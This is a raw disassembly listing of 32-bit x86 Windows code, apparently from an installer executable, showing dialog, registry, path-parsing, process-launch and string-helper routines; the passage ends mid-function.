  405685:	e8 54 e6 ff ff       	call   0x403cde
  40568a:	6a 03                	push   $0x3
  40568c:	57                   	push   %edi
  40568d:	ff 15 64 82 40 00    	call   *0x408264
  405693:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  405697:	39 2d 8c 46 47 00    	cmp    %ebp,0x47468c
  40569d:	74 09                	je     0x4056a8
  40569f:	81 e3 fd fe ff ff    	and    $0xfffffefd,%ebx
  4056a5:	83 cb 04             	or     $0x4,%ebx
  4056a8:	8b cb                	mov    %ebx,%ecx
  4056aa:	83 e1 08             	and    $0x8,%ecx
  4056ad:	51                   	push   %ecx
  4056ae:	50                   	push   %eax
  4056af:	ff 15 38 82 40 00    	call   *0x408238
  4056b5:	8b c3                	mov    %ebx,%eax
  4056b7:	25 00 01 00 00       	and    $0x100,%eax
  4056bc:	50                   	push   %eax
  4056bd:	ff 74 24 30          	push   0x30(%esp)
  4056c1:	ff 15 74 82 40 00    	call   *0x408274
  4056c7:	8b c3                	mov    %ebx,%eax
  4056c9:	83 e0 02             	and    $0x2,%eax
  4056cc:	50                   	push   %eax
  4056cd:	e8 52 e6 ff ff       	call   0x403d24
  4056d2:	83 e3 04             	and    $0x4,%ebx
  4056d5:	53                   	push   %ebx
  4056d6:	ff 35 34 e2 43 00    	push   0x43e234
  4056dc:	ff 15 74 82 40 00    	call   *0x408274
  4056e2:	3b dd                	cmp    %ebp,%ebx
  4056e4:	74 03                	je     0x4056e9
  4056e6:	55                   	push   %ebp
  4056e7:	eb 02                	jmp    0x4056eb
  4056e9:	6a 01                	push   $0x1
  4056eb:	68 60 f0 00 00       	push   $0xf060
  4056f0:	55                   	push   %ebp
  4056f1:	57                   	push   %edi
  4056f2:	ff 15 d8 81 40 00    	call   *0x4081d8
  4056f8:	50                   	push   %eax
  4056f9:	ff 15 d4 81 40 00    	call   *0x4081d4
  4056ff:	8b 1d 7c 82 40 00    	mov    0x40827c,%ebx
  405705:	6a 01                	push   $0x1
  405707:	55                   	push   %ebp
  405708:	68 f4 00 00 00       	push   $0xf4
  40570d:	ff 74 24 38          	push   0x38(%esp)
  405711:	ff d3                	call   *%ebx
  405713:	39 2d 8c 46 47 00    	cmp    %ebp,0x47468c
  405719:	74 13                	je     0x40572e
  40571b:	55                   	push   %ebp
  40571c:	6a 02                	push   $0x2
  40571e:	68 01 04 00 00       	push   $0x401
  405723:	57                   	push   %edi
  405724:	ff d3                	call   *%ebx
  405726:	ff 35 34 e2 43 00    	push   0x43e234
  40572c:	eb 06                	jmp    0x405734
  40572e:	ff 35 44 e2 43 00    	push   0x43e244
  405734:	e8 fe e5 ff ff       	call   0x403d37
  405739:	68 c0 c5 46 00       	push   $0x46c5c0
  40573e:	bb 60 a2 44 00       	mov    $0x44a260,%ebx
  405743:	53                   	push   %ebx
  405744:	e8 86 08 00 00       	call   0x405fcf
  405749:	ff 76 18             	push   0x18(%esi)
  40574c:	53                   	push   %ebx
  40574d:	e8 93 08 00 00       	call   0x405fe5
  405752:	8d 04 45 60 a2 44 00 	lea    0x44a260(,%eax,2),%eax
  405759:	50                   	push   %eax
  40575a:	e8 f1 0e 00 00       	call   0x406650
  40575f:	53                   	push   %ebx
  405760:	57                   	push   %edi
  405761:	ff 15 2c 82 40 00    	call   *0x40822c
  405767:	55                   	push   %ebp
  405768:	ff 76 08             	push   0x8(%esi)
  40576b:	e8 2b bc ff ff       	call   0x40139b
  405770:	85 c0                	test   %eax,%eax
  405772:	0f 85 97 fe ff ff    	jne    0x40560f
  405778:	39 2e                	cmp    %ebp,(%esi)
  40577a:	0f 84 8f fe ff ff    	je     0x40560f
  405780:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  405784:	75 1d                	jne    0x4057a3
  405786:	39 2d 8c 46 47 00    	cmp    %ebp,0x47468c
  40578c:	0f 85 13 01 00 00    	jne    0x4058a5
  405792:	39 2d 80 46 47 00    	cmp    %ebp,0x474680
  405798:	0f 85 71 fe ff ff    	jne    0x40560f
  40579e:	e9 02 01 00 00       	jmp    0x4058a5
  4057a3:	ff 35 88 c5 46 00    	push   0x46c588
  4057a9:	ff 15 20 82 40 00    	call   *0x408220
  4057af:	39 2e                	cmp    %ebp,(%esi)
  4057b1:	89 35 80 a2 45 00    	mov    %esi,0x45a280
  4057b7:	0f 8e c5 00 00 00    	jle    0x405882
  4057bd:	8b 46 04             	mov    0x4(%esi),%eax
  4057c0:	56                   	push   %esi
  4057c1:	ff 34 85 30 a0 40 00 	push   0x40a030(,%eax,4)
  4057c8:	66 8b 06             	mov    (%esi),%ax
  4057cb:	66 03 05 9c c5 46 00 	add    0x46c59c,%ax
  4057d2:	57                   	push   %edi
  4057d3:	0f b7 c0             	movzwl %ax,%eax
  4057d6:	50                   	push   %eax
  4057d7:	ff 35 d8 45 47 00    	push   0x4745d8
  4057dd:	ff 15 24 82 40 00    	call   *0x408224
  4057e3:	a3 88 c5 46 00       	mov    %eax,0x46c588
  4057e8:	3b c5                	cmp    %ebp,%eax
  4057ea:	0f 84 92 00 00 00    	je     0x405882
  4057f0:	ff 76 2c             	push   0x2c(%esi)
  4057f3:	6a 06                	push   $0x6
  4057f5:	50                   	push   %eax
  4057f6:	e8 e3 e4 ff ff       	call   0x403cde
  4057fb:	8d 44 24 10          	lea    0x10(%esp),%eax
  4057ff:	50                   	push   %eax
  405800:	68 fa 03 00 00       	push   $0x3fa
  405805:	57                   	push   %edi
  405806:	ff 15 64 82 40 00    	call   *0x408264
  40580c:	50                   	push   %eax
  40580d:	ff 15 c0 81 40 00    	call   *0x4081c0
  405813:	8d 44 24 10          	lea    0x10(%esp),%eax
  405817:	50                   	push   %eax
  405818:	57                   	push   %edi
  405819:	ff 15 98 81 40 00    	call   *0x408198
  40581f:	6a 15                	push   $0x15
  405821:	55                   	push   %ebp
  405822:	55                   	push   %ebp
  405823:	ff 74 24 20          	push   0x20(%esp)
  405827:	ff 74 24 20          	push   0x20(%esp)
  40582b:	55                   	push   %ebp
  40582c:	ff 35 88 c5 46 00    	push   0x46c588
  405832:	ff 15 e4 81 40 00    	call   *0x4081e4
  405838:	55                   	push   %ebp
  405839:	ff 76 0c             	push   0xc(%esi)
  40583c:	e8 5a bb ff ff       	call   0x40139b
  405841:	39 2d 94 c5 46 00    	cmp    %ebp,0x46c594
  405847:	75 5c                	jne    0x4058a5
  405849:	6a 08                	push   $0x8
  40584b:	ff 35 88 c5 46 00    	push   0x46c588
  405851:	ff 15 38 82 40 00    	call   *0x408238
  405857:	68 05 04 00 00       	push   $0x405
  40585c:	e8 ed e4 ff ff       	call   0x403d4e
  405861:	eb 1f                	jmp    0x405882
  405863:	ff 35 88 c5 46 00    	push   0x46c588
  405869:	ff 15 20 82 40 00    	call   *0x408220
  40586f:	ff 35 88 a2 45 00    	push   0x45a288
  405875:	89 2d d4 45 47 00    	mov    %ebp,0x4745d4
  40587b:	57                   	push   %edi
  40587c:	ff 15 d0 81 40 00    	call   *0x4081d0
  405882:	39 2d 94 a2 45 00    	cmp    %ebp,0x45a294
  405888:	75 1b                	jne    0x4058a5
  40588a:	39 2d 88 c5 46 00    	cmp    %ebp,0x46c588
  405890:	74 13                	je     0x4058a5
  405892:	6a 0a                	push   $0xa
  405894:	57                   	push   %edi
  405895:	ff 15 38 82 40 00    	call   *0x408238
  40589b:	c7 05 94 a2 45 00 01 	movl   $0x1,0x45a294
  4058a2:	00 00 00 
  4058a5:	33 c0                	xor    %eax,%eax
  4058a7:	5f                   	pop    %edi
  4058a8:	5e                   	pop    %esi
  4058a9:	5d                   	pop    %ebp
  4058aa:	5b                   	pop    %ebx
  4058ab:	83 c4 10             	add    $0x10,%esp
  4058ae:	c2 10 00             	ret    $0x10
  4058b1:	55                   	push   %ebp
  4058b2:	8b ec                	mov    %esp,%ebp
  4058b4:	83 ec 18             	sub    $0x18,%esp
  4058b7:	53                   	push   %ebx
  4058b8:	56                   	push   %esi
  4058b9:	57                   	push   %edi
  4058ba:	8b 3d dc 45 47 00    	mov    0x4745dc,%edi
  4058c0:	6a 06                	push   $0x6
  4058c2:	e8 7e 08 00 00       	call   0x406145
  4058c7:	33 db                	xor    %ebx,%ebx
  4058c9:	3b c3                	cmp    %ebx,%eax
  4058cb:	74 12                	je     0x4058df
  4058cd:	ff d0                	call   *%eax
  4058cf:	0f b7 c0             	movzwl %ax,%eax
  4058d2:	50                   	push   %eax
  4058d3:	68 c0 50 4d 00       	push   $0x4d50c0
  4058d8:	e8 39 06 00 00       	call   0x405f16
  4058dd:	eb 5b                	jmp    0x40593a
  4058df:	6a 30                	push   $0x30
  4058e1:	58                   	pop    %eax
  4058e2:	6a 78                	push   $0x78
  4058e4:	66 a3 c0 50 4d 00    	mov    %ax,0x4d50c0
  4058ea:	58                   	pop    %eax
  4058eb:	53                   	push   %ebx
  4058ec:	be 60 a2 44 00       	mov    $0x44a260,%esi
  4058f1:	56                   	push   %esi
  4058f2:	53                   	push   %ebx
  4058f3:	66 a3 c2 50 4d 00    	mov    %ax,0x4d50c2
  4058f9:	68 58 87 40 00       	push   $0x408758
  4058fe:	33 c0                	xor    %eax,%eax
  405900:	68 01 00 00 80       	push   $0x80000001
  405905:	66 a3 c4 50 4d 00    	mov    %ax,0x4d50c4
  40590b:	e8 88 05 00 00       	call   0x405e98
  405910:	66 39 1d 60 a2 44 00 	cmp    %bx,0x44a260
  405917:	75 16                	jne    0x40592f
  405919:	53                   	push   %ebx
  40591a:	56                   	push   %esi
  40591b:	68 94 87 40 00       	push   $0x408794
  405920:	68 08 87 40 00       	push   $0x408708
  405925:	68 03 00 00 80       	push   $0x80000003
  40592a:	e8 69 05 00 00       	call   0x405e98
  40592f:	56                   	push   %esi
  405930:	68 c0 50 4d 00       	push   $0x4d50c0
  405935:	e8 20 07 00 00       	call   0x40605a
  40593a:	e8 d4 e4 ff ff       	call   0x403e13
  40593f:	a1 28 46 47 00       	mov    0x474628,%eax
  405944:	83 e0 20             	and    $0x20,%eax
  405947:	68 a8 90 4c 00       	push   $0x4c90a8
  40594c:	a3 80 46 47 00       	mov    %eax,0x474680
  405951:	c7 05 9c 46 47 00 00 	movl   $0x10000,0x47469c
  405958:	00 01 00 
  40595b:	e8 68 0c 00 00       	call   0x4065c8
  405960:	85 c0                	test   %eax,%eax
  405962:	0f 85 94 00 00 00    	jne    0x4059fc
  405968:	8b 4f 48             	mov    0x48(%edi),%ecx
  40596b:	3b cb                	cmp    %ebx,%ecx
  40596d:	0f 84 89 00 00 00    	je     0x4059fc
  405973:	a1 f8 45 47 00       	mov    0x4745f8,%eax
  405978:	8b 57 4c             	mov    0x4c(%edi),%edx
  40597b:	53                   	push   %ebx
  40597c:	be 40 45 46 00       	mov    $0x464540,%esi
  405981:	56                   	push   %esi
  405982:	8d 14 50             	lea    (%eax,%edx,2),%edx
  405985:	52                   	push   %edx
  405986:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  405989:	50                   	push   %eax
  40598a:	ff 77 44             	push   0x44(%edi)
  40598d:	e8 06 05 00 00       	call   0x405e98
  405992:	66 a1 40 45 46 00    	mov    0x464540,%ax
  405998:	66 3b c3             	cmp    %bx,%ax
  40599b:	74 5f                	je     0x4059fc
  40599d:	66 83 f8 22          	cmp    $0x22,%ax
  4059a1:	75 14                	jne    0x4059b7
  4059a3:	b8 42 45 46 00       	mov    $0x464542,%eax
  4059a8:	6a 22                	push   $0x22
  4059aa:	50                   	push   %eax
  4059ab:	8b f0                	mov    %eax,%esi
  4059ad:	e8 ba 02 00 00       	call   0x405c6c
  4059b2:	33 c9                	xor    %ecx,%ecx
  4059b4:	66 89 08             	mov    %cx,(%eax)
  4059b7:	56                   	push   %esi
  4059b8:	e8 28 06 00 00       	call   0x405fe5
  4059bd:	8d 44 46 f8          	lea    -0x8(%esi,%eax,2),%eax
  4059c1:	3b c6                	cmp    %esi,%eax
  4059c3:	76 26                	jbe    0x4059eb
  4059c5:	68 f8 86 40 00       	push   $0x4086f8
  4059ca:	50                   	push   %eax
  4059cb:	ff 15 18 81 40 00    	call   *0x408118
  4059d1:	85 c0                	test   %eax,%eax
  4059d3:	75 16                	jne    0x4059eb
  4059d5:	56                   	push   %esi
  4059d6:	ff 15 7c 80 40 00    	call   *0x40807c
  4059dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4059df:	74 04                	je     0x4059e5
  4059e1:	a8 10                	test   $0x10,%al
  4059e3:	75 06                	jne    0x4059eb
  4059e5:	56                   	push   %esi
  4059e6:	e8 b0 0b 00 00       	call   0x40659b
  4059eb:	56                   	push   %esi
  4059ec:	e8 7b 0b 00 00       	call   0x40656c
  4059f1:	50                   	push   %eax
  4059f2:	68 a8 90 4c 00       	push   $0x4c90a8
  4059f7:	e8 d3 05 00 00       	call   0x405fcf
  4059fc:	be a8 90 4c 00       	mov    $0x4c90a8,%esi
  405a01:	56                   	push   %esi
  405a02:	e8 c1 0b 00 00       	call   0x4065c8
  405a07:	85 c0                	test   %eax,%eax
  405a09:	75 0c                	jne    0x405a17
  405a0b:	ff b7 18 01 00 00    	push   0x118(%edi)
  405a11:	56                   	push   %esi
  405a12:	e8 39 0c 00 00       	call   0x406650
  405a17:	68 40 80 00 00       	push   $0x8040
  405a1c:	53                   	push   %ebx
  405a1d:	53                   	push   %ebx
  405a1e:	6a 01                	push   $0x1
  405a20:	6a 67                	push   $0x67
  405a22:	ff 35 d8 45 47 00    	push   0x4745d8
  405a28:	ff 15 6c 82 40 00    	call   *0x40826c
  405a2e:	a3 90 c5 46 00       	mov    %eax,0x46c590
  405a33:	83 7f 50 ff          	cmpl   $0xffffffff,0x50(%edi)
  405a37:	be 60 c5 46 00       	mov    $0x46c560,%esi
  405a3c:	0f 84 8a 00 00 00    	je     0x405acc
  405a42:	8b 0d f0 86 40 00    	mov    0x4086f0,%ecx
  405a48:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405a4b:	8b 0d f4 86 40 00    	mov    0x4086f4,%ecx
  405a51:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405a54:	8b 0d d8 45 47 00    	mov    0x4745d8,%ecx
  405a5a:	a3 74 c5 46 00       	mov    %eax,0x46c574
  405a5f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405a62:	56                   	push   %esi
  405a63:	c7 05 64 c5 46 00 00 	movl   $0x401000,0x46c564
  405a6a:	10 40 00 
  405a6d:	89 0d 70 c5 46 00    	mov    %ecx,0x46c570
  405a73:	a3 84 c5 46 00       	mov    %eax,0x46c584
  405a78:	ff 15 f8 81 40 00    	call   *0x4081f8
  405a7e:	66 85 c0             	test   %ax,%ax
  405a81:	0f 84 17 01 00 00    	je     0x405b9e
  405a87:	53                   	push   %ebx
  405a88:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405a8b:	50                   	push   %eax
  405a8c:	53                   	push   %ebx
  405a8d:	6a 30                	push   $0x30
  405a8f:	ff 15 f4 81 40 00    	call   *0x4081f4
  405a95:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405a98:	2b 45 ec             	sub    -0x14(%ebp),%eax
  405a9b:	53                   	push   %ebx
  405a9c:	ff 35 d8 45 47 00    	push   0x4745d8
  405aa2:	53                   	push   %ebx
  405aa3:	53                   	push   %ebx
  405aa4:	50                   	push   %eax
  405aa5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405aa8:	2b 45 e8             	sub    -0x18(%ebp),%eax
  405aab:	50                   	push   %eax
  405aac:	ff 75 ec             	push   -0x14(%ebp)
  405aaf:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ab2:	ff 75 e8             	push   -0x18(%ebp)
  405ab5:	68 00 00 00 80       	push   $0x80000000
  405aba:	53                   	push   %ebx
  405abb:	50                   	push   %eax
  405abc:	68 80 00 00 00       	push   $0x80
  405ac1:	ff 15 f0 81 40 00    	call   *0x4081f0
  405ac7:	a3 40 e2 43 00       	mov    %eax,0x43e240
  405acc:	53                   	push   %ebx
  405acd:	e8 0b ba ff ff       	call   0x4014dd
  405ad2:	85 c0                	test   %eax,%eax
  405ad4:	74 08                	je     0x405ade
  405ad6:	6a 02                	push   $0x2
  405ad8:	58                   	pop    %eax
  405ad9:	e9 c2 00 00 00       	jmp    0x405ba0
  405ade:	e8 30 e3 ff ff       	call   0x403e13
  405ae3:	39 1d a0 46 47 00    	cmp    %ebx,0x4746a0
  405ae9:	0f 85 86 00 00 00    	jne    0x405b75
  405aef:	6a 05                	push   $0x5
  405af1:	ff 35 40 e2 43 00    	push   0x43e240
  405af7:	ff 15 38 82 40 00    	call   *0x408238
  405afd:	8b 3d e0 80 40 00    	mov    0x4080e0,%edi
  405b03:	68 dc 86 40 00       	push   $0x4086dc
  405b08:	ff d7                	call   *%edi
  405b0a:	85 c0                	test   %eax,%eax
  405b0c:	75 07                	jne    0x405b15
  405b0e:	68 c8 86 40 00       	push   $0x4086c8
  405b13:	ff d7                	call   *%edi
  405b15:	8b 3d 58 82 40 00    	mov    0x408258,%edi
  405b1b:	56                   	push   %esi
  405b1c:	68 b0 86 40 00       	push   $0x4086b0
  405b21:	53                   	push   %ebx
  405b22:	ff d7                	call   *%edi
  405b24:	85 c0                	test   %eax,%eax
  405b26:	75 1a                	jne    0x405b42
  405b28:	56                   	push   %esi
  405b29:	68 9c 86 40 00       	push   $0x40869c
  405b2e:	53                   	push   %ebx
  405b2f:	ff d7                	call   *%edi
  405b31:	56                   	push   %esi
  405b32:	c7 05 84 c5 46 00 b0 	movl   $0x4086b0,0x46c584
  405b39:	86 40 00 
  405b3c:	ff 15 f8 81 40 00    	call   *0x4081f8
  405b42:	a1 9c c5 46 00       	mov    0x46c59c,%eax
  405b47:	53                   	push   %ebx
  405b48:	68 fe 53 40 00       	push   $0x4053fe
  405b4d:	83 c0 69             	add    $0x69,%eax
  405b50:	0f b7 c0             	movzwl %ax,%eax
  405b53:	53                   	push   %ebx
  405b54:	50                   	push   %eax
  405b55:	ff 35 d8 45 47 00    	push   0x4745d8
  405b5b:	ff 15 e8 81 40 00    	call   *0x4081e8
  405b61:	6a 05                	push   $0x5
  405b63:	8b f0                	mov    %eax,%esi
  405b65:	e8 73 b9 ff ff       	call   0x4014dd
  405b6a:	6a 01                	push   $0x1
  405b6c:	e8 96 e0 ff ff       	call   0x403c07
  405b71:	8b c6                	mov    %esi,%eax
  405b73:	eb 2b                	jmp    0x405ba0
  405b75:	53                   	push   %ebx
  405b76:	e8 86 f4 ff ff       	call   0x405001
  405b7b:	85 c0                	test   %eax,%eax
  405b7d:	74 18                	je     0x405b97
  405b7f:	39 1d 94 c5 46 00    	cmp    %ebx,0x46c594
  405b85:	0f 85 4b ff ff ff    	jne    0x405ad6
  405b8b:	6a 02                	push   $0x2
  405b8d:	e8 4b b9 ff ff       	call   0x4014dd
  405b92:	e9 3f ff ff ff       	jmp    0x405ad6
  405b97:	6a 01                	push   $0x1
  405b99:	e8 3f b9 ff ff       	call   0x4014dd
  405b9e:	33 c0                	xor    %eax,%eax
  405ba0:	5f                   	pop    %edi
  405ba1:	5e                   	pop    %esi
  405ba2:	5b                   	pop    %ebx
  405ba3:	c9                   	leave
  405ba4:	c3                   	ret
  405ba5:	55                   	push   %ebp
  405ba6:	8b ec                	mov    %esp,%ebp
  405ba8:	83 ec 10             	sub    $0x10,%esp
  405bab:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405bae:	50                   	push   %eax
  405baf:	68 98 a2 45 00       	push   $0x45a298
  405bb4:	33 c0                	xor    %eax,%eax
  405bb6:	50                   	push   %eax
  405bb7:	50                   	push   %eax
  405bb8:	50                   	push   %eax
  405bb9:	50                   	push   %eax
  405bba:	50                   	push   %eax
  405bbb:	50                   	push   %eax
  405bbc:	ff 75 08             	push   0x8(%ebp)
  405bbf:	c7 05 98 a2 45 00 44 	movl   $0x44,0x45a298
  405bc6:	00 00 00 
  405bc9:	50                   	push   %eax
  405bca:	ff 15 e4 80 40 00    	call   *0x4080e4
  405bd0:	85 c0                	test   %eax,%eax
  405bd2:	74 0c                	je     0x405be0
  405bd4:	ff 75 f4             	push   -0xc(%ebp)
  405bd7:	ff 15 bc 80 40 00    	call   *0x4080bc
  405bdd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405be0:	c9                   	leave
  405be1:	c2 04 00             	ret    $0x4
  405be4:	ff 25 fc 81 40 00    	jmp    *0x4081fc
  405bea:	68 04 20 00 00       	push   $0x2004
  405bef:	ff 74 24 0c          	push   0xc(%esp)
  405bf3:	ff 74 24 0c          	push   0xc(%esp)
  405bf7:	ff 35 88 c5 46 00    	push   0x46c588
  405bfd:	ff 15 00 82 40 00    	call   *0x408200
  405c03:	c2 08 00             	ret    $0x8
  405c06:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c0a:	8b c8                	mov    %eax,%ecx
  405c0c:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405c12:	83 3d a0 46 47 00 00 	cmpl   $0x0,0x4746a0
  405c19:	74 07                	je     0x405c22
  405c1b:	c1 e8 15             	shr    $0x15,%eax
  405c1e:	85 c0                	test   %eax,%eax
  405c20:	75 47                	jne    0x405c69
  405c22:	83 3d a8 46 47 00 00 	cmpl   $0x0,0x4746a8
  405c29:	74 06                	je     0x405c31
  405c2b:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405c31:	a1 d4 45 47 00       	mov    0x4745d4,%eax
  405c36:	a3 4c a0 40 00       	mov    %eax,0x40a04c
  405c3b:	a1 d8 45 47 00       	mov    0x4745d8,%eax
  405c40:	a3 50 a0 40 00       	mov    %eax,0x40a050
  405c45:	8b 44 24 04          	mov    0x4(%esp),%eax
  405c49:	68 48 a0 40 00       	push   $0x40a048
  405c4e:	a3 54 a0 40 00       	mov    %eax,0x40a054
  405c53:	c7 05 58 a0 40 00 c0 	movl   $0x46c5c0,0x40a058
  405c5a:	c5 46 00 
  405c5d:	89 0d 5c a0 40 00    	mov    %ecx,0x40a05c
  405c63:	ff 15 04 82 40 00    	call   *0x408204
  405c69:	c2 08 00             	ret    $0x8
  405c6c:	8b 44 24 04          	mov    0x4(%esp),%eax
  405c70:	eb 0e                	jmp    0x405c80
  405c72:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405c77:	74 0f                	je     0x405c88
  405c79:	50                   	push   %eax
  405c7a:	ff 15 54 82 40 00    	call   *0x408254
  405c80:	0f b7 08             	movzwl (%eax),%ecx
  405c83:	66 85 c9             	test   %cx,%cx
  405c86:	75 ea                	jne    0x405c72
  405c88:	c2 08 00             	ret    $0x8
  405c8b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405c8f:	0f b7 01             	movzwl (%ecx),%eax
  405c92:	8b d0                	mov    %eax,%edx
  405c94:	83 ca 20             	or     $0x20,%edx
  405c97:	0f b7 d2             	movzwl %dx,%edx
  405c9a:	66 83 f8 5c          	cmp    $0x5c,%ax
  405c9e:	75 06                	jne    0x405ca6
  405ca0:	66 39 41 02          	cmp    %ax,0x2(%ecx)
  405ca4:	74 10                	je     0x405cb6
  405ca6:	83 c2 9f             	add    $0xffffff9f,%edx
  405ca9:	66 83 fa 19          	cmp    $0x19,%dx
  405cad:	77 0c                	ja     0x405cbb
  405caf:	66 83 79 02 3a       	cmpw   $0x3a,0x2(%ecx)
  405cb4:	75 05                	jne    0x405cbb
  405cb6:	33 c0                	xor    %eax,%eax
  405cb8:	40                   	inc    %eax
  405cb9:	eb 02                	jmp    0x405cbd
  405cbb:	33 c0                	xor    %eax,%eax
  405cbd:	c2 04 00             	ret    $0x4
  405cc0:	53                   	push   %ebx
  405cc1:	56                   	push   %esi
  405cc2:	8b 35 54 82 40 00    	mov    0x408254,%esi
  405cc8:	57                   	push   %edi
  405cc9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405ccd:	57                   	push   %edi
  405cce:	ff d6                	call   *%esi
  405cd0:	8b d8                	mov    %eax,%ebx
  405cd2:	53                   	push   %ebx
  405cd3:	ff d6                	call   *%esi
  405cd5:	0f b7 0f             	movzwl (%edi),%ecx
  405cd8:	66 85 c9             	test   %cx,%cx
  405cdb:	74 12                	je     0x405cef
  405cdd:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405ce1:	75 0c                	jne    0x405cef
  405ce3:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405ce8:	75 05                	jne    0x405cef
  405cea:	50                   	push   %eax
  405ceb:	ff d6                	call   *%esi
  405ced:	eb 28                	jmp    0x405d17
  405cef:	66 83 f9 5c          	cmp    $0x5c,%cx
  405cf3:	75 20                	jne    0x405d15
  405cf5:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405cf9:	75 1a                	jne    0x405d15
  405cfb:	6a 02                	push   $0x2
  405cfd:	5e                   	pop    %esi
  405cfe:	6a 5c                	push   $0x5c
  405d00:	50                   	push   %eax
  405d01:	4e                   	dec    %esi
  405d02:	e8 65 ff ff ff       	call   0x405c6c
  405d07:	66 83 38 00          	cmpw   $0x0,(%eax)
  405d0b:	74 08                	je     0x405d15
  405d0d:	40                   	inc    %eax
  405d0e:	40                   	inc    %eax
  405d0f:	85 f6                	test   %esi,%esi
  405d11:	75 eb                	jne    0x405cfe
  405d13:	eb 02                	jmp    0x405d17
  405d15:	33 c0                	xor    %eax,%eax
  405d17:	5f                   	pop    %edi
  405d18:	5e                   	pop    %esi
  405d19:	5b                   	pop    %ebx
  405d1a:	c2 04 00             	ret    $0x4
  405d1d:	55                   	push   %ebp
  405d1e:	8b ec                	mov    %esp,%ebp
  405d20:	51                   	push   %ecx
  405d21:	53                   	push   %ebx
  405d22:	56                   	push   %esi
  405d23:	57                   	push   %edi
  405d24:	ff 75 0c             	push   0xc(%ebp)
  405d27:	8b 3d 50 81 40 00    	mov    0x408150,%edi
  405d2d:	ff d7                	call   *%edi
  405d2f:	8b 75 08             	mov    0x8(%ebp),%esi
  405d32:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d35:	eb 27                	jmp    0x405d5e
  405d37:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d3a:	ff 75 0c             	push   0xc(%ebp)
  405d3d:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405d40:	56                   	push   %esi
  405d41:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  405d45:	ff 15 e8 80 40 00    	call   *0x4080e8
  405d4b:	85 c0                	test   %eax,%eax
  405d4d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d50:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405d53:	74 1a                	je     0x405d6f
  405d55:	56                   	push   %esi
  405d56:	ff 15 08 82 40 00    	call   *0x408208
  405d5c:	8b f0                	mov    %eax,%esi
  405d5e:	56                   	push   %esi
  405d5f:	ff d7                	call   *%edi
  405d61:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405d64:	7d d1                	jge    0x405d37
  405d66:	33 c0                	xor    %eax,%eax
  405d68:	5f                   	pop    %edi
  405d69:	5e                   	pop    %esi
  405d6a:	5b                   	pop    %ebx
  405d6b:	c9                   	leave
  405d6c:	c2 08 00             	ret    $0x8
  405d6f:	8b c6                	mov    %esi,%eax
  405d71:	eb f5                	jmp    0x405d68
  405d73:	53                   	push   %ebx
  405d74:	56                   	push   %esi
  405d75:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405d79:	57                   	push   %edi
  405d7a:	33 ff                	xor    %edi,%edi
  405d7c:	3b f7                	cmp    %edi,%esi
  405d7e:	74 46                	je     0x405dc6
  405d80:	39 7c 24 14          	cmp    %edi,0x14(%esp)
  405d84:	74 40                	je     0x405dc6
  405d86:	33 c0                	xor    %eax,%eax
  405d88:	66 3b 06             	cmp    (%esi),%ax
  405d8b:	74 39                	je     0x405dc6
  405d8d:	8b c6                	mov    %esi,%eax
  405d8f:	2b 44 24 14          	sub    0x14(%esp),%eax
  405d93:	8b 54 24 14          	mov    0x14(%esp),%edx
  405d97:	0f b7 0a             	movzwl (%edx),%ecx
  405d9a:	33 db                	xor    %ebx,%ebx
  405d9c:	66 3b d9             	cmp    %cx,%bx
  405d9f:	74 15                	je     0x405db6
  405da1:	0f b7 c9             	movzwl %cx,%ecx
  405da4:	66 3b 0c 10          	cmp    (%eax,%edx,1),%cx
  405da8:	75 0c                	jne    0x405db6
  405daa:	42                   	inc    %edx
  405dab:	42                   	inc    %edx
  405dac:	0f b7 0a             	movzwl (%edx),%ecx
  405daf:	33 db                	xor    %ebx,%ebx
  405db1:	66 3b d9             	cmp    %cx,%bx
  405db4:	75 ee                	jne    0x405da4
  405db6:	33 c9                	xor    %ecx,%ecx
  405db8:	66 3b 0a             	cmp    (%edx),%cx
  405dbb:	74 0f                	je     0x405dcc
  405dbd:	47                   	inc    %edi
  405dbe:	40                   	inc    %eax
  405dbf:	40                   	inc    %eax
  405dc0:	66 3b 0c 7e          	cmp    (%esi,%edi,2),%cx
  405dc4:	75 cd                	jne    0x405d93
  405dc6:	33 c0                	xor    %eax,%eax
  405dc8:	5f                   	pop    %edi
  405dc9:	5e                   	pop    %esi
  405dca:	5b                   	pop    %ebx
  405dcb:	c3                   	ret
  405dcc:	8d 04 7e             	lea    (%esi,%edi,2),%eax
  405dcf:	eb f7                	jmp    0x405dc8
  405dd1:	55                   	push   %ebp
  405dd2:	8b ec                	mov    %esp,%ebp
  405dd4:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405dd8:	8b 45 08             	mov    0x8(%ebp),%eax
  405ddb:	7e 14                	jle    0x405df1
  405ddd:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405de0:	2b c8                	sub    %eax,%ecx
  405de2:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  405de5:	ff 4d 10             	decl   0x10(%ebp)
  405de8:	88 10                	mov    %dl,(%eax)
  405dea:	40                   	inc    %eax
